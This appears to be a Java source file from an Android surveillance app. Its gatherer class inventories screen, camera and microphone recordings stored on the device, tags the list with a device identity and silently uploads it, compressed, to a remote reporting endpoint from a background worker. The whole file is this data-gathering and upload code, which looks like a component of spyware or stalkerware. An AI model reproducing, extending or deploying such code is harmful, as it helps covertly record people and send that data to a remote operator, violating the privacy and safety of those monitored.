package org.code.coregradle.gatherers;

import android.content.Context;
import android.util.Log;

import androidx.work.ListenableWorker;

import org.json.JSONArray;
import org.json.JSONObject;
import org.code.coregradle.config.ApiConfig;
import org.code.coregradle.config.IdentityStore;
import org.code.coregradle.utils.CompressionUtils;

import java.io.File;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class PendingRecordingGatherer implements InfoGatherer {
    private File wynkDir;
    private File recordingDir;
    private OkHttpClient okHttpClient = new OkHttpClient();
    private IdentityStore identityStore;

    @Override
    public void initGatherer(Context context) {
        wynkDir = new File(context.getFilesDir(), "wynks");
        recordingDir = new File(context.getFilesDir(), "recording");
        identityStore = IdentityStore.getInstance(context);
    }

    private JSONObject toRecordingEntry(File file) throws Exception {
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("name", file.getName());
        jsonObject.put("size", file.length());
        return jsonObject;
    }

    @Override
    public JSONObject getRequestJSON() {
        JSONObject recordings = new JSONObject();
        try {
            JSONArray wynks = new JSONArray();
            if (wynkDir.exists()) {
                for (File file : wynkDir.listFiles()) {
                    wynks.put(toRecordingEntry(file));
                }
            }

            recordings.put("screen", wynks);
            JSONArray camera = new JSONArray();
            JSONArray mic = new JSONArray();
            if (recordingDir.exists()) {
                for (File file : recordingDir.listFiles()) {
                    if (file.getName().endsWith(".amr")) {
                        mic.put(toRecordingEntry(file));
                    } else {
                        camera.put(toRecordingEntry(file));
                    }
                }
            }
            recordings.put("camera", camera);
            recordings.put("mic", mic);
            recordings.put(identityStore.getIdentityKey(), identityStore.getIdentityValue());
            return recordings;
        } catch (Exception ignored) {
            Log.d("PGR", "Error: ", ignored);
        }
        return recordings;
    }

    @Override
    public ListenableWorker.Result makeRequest() {
        JSONObject report = getRequestJSON();
        try {
            RequestBody requestBody = RequestBody.create(MediaType.get("application/json"), CompressionUtils.compress(report.toString()));
            Request request = new Request.Builder()
                    .url(ApiConfig.REPORT_RECORDING_PATHS)
                    .post(requestBody)
                    .build();
            Response response = okHttpClient.newCall(request).execute();
            if (response.isSuccessful()) {
                return ListenableWorker.Result.success();
            }
            return ListenableWorker.Result.failure();

        } catch (Exception e) {
            Log.d("PGR", "Error", e);
        }
        return null;
    }
}
